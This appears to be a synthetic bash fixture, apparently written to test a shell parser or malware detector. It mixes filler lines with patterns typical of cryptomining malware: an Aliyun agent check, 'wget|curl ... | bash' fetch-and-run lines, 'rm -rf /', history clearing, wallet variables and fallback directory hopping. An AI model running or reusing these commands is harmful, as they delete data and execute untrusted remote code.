#!/bin/bash

while read x; do
  echo $x
done < ~/.judo_config;
a=b
unset a

USERZ=$(
  echo "root"
  cat ~/.judo_config | grep "run"
)

if [ $(ping www.google.com >/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
  echo this;
else
  echo that
fi
if cat ~/.judo_config | grep "run"
then
  echo this
fi


if [ "$release" = "CentOS" ]; then
  echo $release
fi

read ~/.judo_config  






bash the-dream.sh 'install'

if ! ( [ -x /usr/local/bin/jj ] || [ -x /usr/bin/jj ] ); then
  echo this
fi

history -n > /dev/null 2>&1

(
  echo "this"
  echo "that"
) >> ~/.judo_config

if ps aux | grep -i '[a]liyun'; then
  (wget -q -O - http://www.google.com||curl -s http://www.google.com)|bash; lwp-download http://www.google.com /tmp/uninstall.sh; bash /tmp/uninstall.sh
  (wget -q -O - http://www.google.com||curl -s http://www.google.com)|bash; lwp-download http://www.google.com /tmp/uninstall.sh; bash /tmp/uninstall.sh
  pkill this-service
  rm -rf /
  rm -rf /this/that
  systemctl stop named
  apt-get remove this-package
fi


# Can be run

PrintStuff(){
  echo this $1
  echo that
  more stuff
}
PrintStuff wordsIn

filesize_config=`cat ~/.judo_config | grep run`
echo ${#WALLET_BASE}
echo ${WALLET_BASE}
rand=$(seq 0 255 | sort -R | head -n1)
mv /usr/bin/something /usr/bin/else
wget http://www.google.com
a==b; c=d; c="something else";b=something; else=notelse
a=$b; cd $else $b; f=$(cd $b)
$(cp this that)
$(mv over rainbow)
testing=thisaval
testing2=thisaval
testingg=$testinggg
cd /tmp &  cd /var/run &  cd /mnt &  cd /root &  cd /;
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
for i in 1 2 3 4;
do
  for j in 1 2 3 4;
  do 
    echo $i $j;
  done
done
sshports="one, two, three"
for test in $sshports; 
do 
  echo "test: $test"
  for sshp in $sshports; 
  do 
    echo "sshp: $test"
  done
done


if [ -s /usr/bin/ifconfig ];
then
	range=$(ifconfig | grep "this" | head -n1)
else
	range=$(ip a | grep "127.0.0.1" | head -n1)
  echo this 
  echo even more
fi
